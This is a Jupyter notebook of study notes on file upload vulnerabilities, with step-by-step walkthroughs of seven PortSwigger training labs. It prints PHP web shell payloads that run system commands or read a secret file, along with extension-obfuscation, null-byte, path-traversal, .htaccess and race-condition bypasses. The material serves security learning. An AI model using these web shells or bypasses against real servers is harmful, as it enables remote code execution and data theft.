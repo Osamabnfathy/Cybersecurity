{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                            # File Upload Vulnerability                                 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> labs:  \n",
    "   - https://portswigger.net/web-security/file-upload\n",
    "   \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=PKO9PzHP4pA&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=31&pp=iAQB"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">> What are file upload vulnerabilities?\n",
    "   - are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.\n",
    "   \n",
    ">> What is the impact of file upload vulnerabilities?\n",
    "   - Which aspect of the file the website fails to validate properly, whether that be its size, type, contents, and so on.\n",
    "   - What restrictions are imposed on the file once it has been successfully uploaded.\n",
    "   \n",
    ">> Web shell:\n",
    "   - malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.\n",
    "   \n",
    ">> Command to read arbitrary files from a remote web server:\n",
    "   - ``` <?php echo file_get_contents('/path/to/target/file'); ?> ```\n",
    "   \n",
    ">> Command to execute system commands on a remote web server:\n",
    "   - ``` <?php echo system($_GET['command']); ?> ```\n",
    "   - By sending this request ``` GET /example/exploit.php?command=id HTTP/1.1 ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Obfuscating file extensions:\n",
    "\n",
    "- Provide multiple extensions, may be interpreted as either a PHP file or JPG image:\n",
    "  - ``` exploit.php.jpg ```\n",
    "  \n",
    "- Using the URL encoding OR Double URL encoding for (. - / - \\):\n",
    "  - exploit%2Ephp\n",
    "\n",
    "- Add semicolons or URL-encoded null byte characters before the file extension:\n",
    "  - ``` exploit.asp;.jpg ```\n",
    "  - ``` exploit.asp%00.jpg ```\n",
    "\n",
    "- Stripping the extension:\n",
    "  - ``` exploit.p.phphp ```\n",
    "  \n",
    "- JPEG files always begin with the bytes ``` FF D8 FF ```."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1:  Remote code execution via web shell upload:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Create a file called \"Shell.php\" contains the payload\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- Upload it then request the The Avatar location to read this file \n",
    "- ``` GET /files/avatars/Shell.php HTTP/2 ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Web shell upload via Content-Type restriction bypass:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Create a file called \"shell.php\" contains the payload:\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- Upload it then Intercept the request to change the content type \"Validation on it\"\n",
    "- ``` Content-Type: image/png ```\n",
    "- Now request the Avatar location to read the file:\n",
    "- ``` GET /files/avatars/shell.php HTTP/2 ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: Web shell upload via path traversal:\n",
    "\n",
    "- log with (wiener:peter)\n",
    "- Create a file called \"shell.php\" contains the payload:\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- Upload it then request the next url to see the secret key\n",
    "- ``` GET /files/avatars/shell.php HTTP/2 ```\n",
    "- Now the file wasn't excuted on the server so you need to change the file of uploading by\n",
    "- Change the name of the file to ``` ..%2fshell.php ``` to get back one directory\n",
    "- Intercept the request, In *Content-Disposition* change the *filename*\n",
    "- Now request the Avatar locatoin to read the file:\n",
    "- ``` GET /files/avatars/../shell.php HTTP/2 ``` \n",
    "- OR ``` GET /files/shell.php HTTP/2 ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: Web shell upload via extension blacklist bypass:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Create a file called \"shell.php\" contains the payload and upload it:\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- You'll see that the server didn't accept the *.php* extension\n",
    "- Now change the *filename* to *.htaccess* to edit the configuration file of the server\n",
    "- Change the *Content-Type:* to *text/plain*\n",
    "- Add *AddType application/x-httpd-php .l33t* to the body enables excuting *.l33t* extension\n",
    "- Send the request then\n",
    "- Change the *filename* to *shell.l33t* \n",
    "- Change the *Content-Type:* to *application/x-php*\n",
    "- Add *<?php echo file_get_contents('/home/carlos/secret'); ?>* as the data of the file\n",
    "- Send the request then\n",
    "- Request the Avatar locatoin to read the file:\n",
    "- ``` GET /files/avatars/shell.l33t HTTP/2 ``` "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-5: Web shell upload via obfuscated file extension:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Create a file called \"shell.php\" contains the payload and upload it:\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- You'll see that the server didn't accept the *.php* extension\n",
    "- Change the *filename* to *shell.php%00.jpg* using the Null Byte to escape the validation\n",
    "- Request the Avatar locatoin to read the file:\n",
    "- ``` GET /files/avatars/shell.php HTTP/2 ``` "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-6: Remote code execution via polyglot web shell upload:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Upload a real Image and Intercept the request\n",
    "- Delete some data from *Content-Type* and add the payload on the center of the data\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- Now the Server accept the file and upload it\n",
    "- Request the Avatar locatoin to read the file:\n",
    "- ``` GET /files/avatars/shell.php HTTP/2 ``` \n",
    "- You'll see the Secret key inside the data of the photo \n",
    "- OR you can open the Image in a new file and you'll see the secret key obvous"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-7: Web shell upload via race condition:\n",
    "\n",
    "- Log with (wiener:peter)\n",
    "- Create a file called \"shell.php\" contains the payload and upload it:\n",
    "- ``` <?php echo file_get_contents('/home/carlos/secret'); ?> ```\n",
    "- You'll see that the server didn't accept the *.php* extension\n",
    "- Note the Time taken to render the request \"using Sandbox\"\n",
    "- Here the Trick is to send the request of the uploading file\n",
    "- In the same time send the request of requesting the avatar location \n",
    "- To exploit the Race condition Vuln\n",
    "\n",
    "- OR Use the Burb Extention *TurboIntruder*"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
